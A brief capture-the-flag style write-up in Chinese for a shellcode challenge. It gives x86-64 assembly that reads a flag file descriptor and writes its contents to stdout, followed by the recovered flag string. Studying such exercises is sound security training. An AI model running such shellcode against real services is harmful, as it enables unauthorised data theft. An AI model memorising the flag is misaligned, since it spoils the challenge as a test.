# CPSC233 Assignment 2

## 题目简述

服务打开 flag 文件，并把文件描述符作为第一个参数传给攻击者 shellcode。目标是只用 Linux x86-64 系统调用从该描述符读取内容，再写到标准输出。

## 解题过程

入口时 rdi 已是 flag 的 fd。先保存它，执行 read(fd, 0x2333100, 0x100)，再执行 write(1, 0x2333100, n)：

~~~asm
mov r8, rdi
xor eax, eax
mov rdi, r8
mov rsi, 0x2333100
mov rdx, 0x100
syscall

mov rdx, rax
mov eax, 1
mov edi, 1
mov rsi, 0x2333100
syscall
ret
~~~

发送组装后的字节即可读出：

~~~text
maple{p21n71n9_1n_4445555mmmm}
~~~

## 方法总结

系统调用 ABI 与普通函数 ABI 不完全相同：调用号在 rax，参数依次在 rdi、rsi、rdx、r10、r8、r9。read 的返回值是实际读取长度，传给 write 比固定输出整个缓冲区更稳妥。
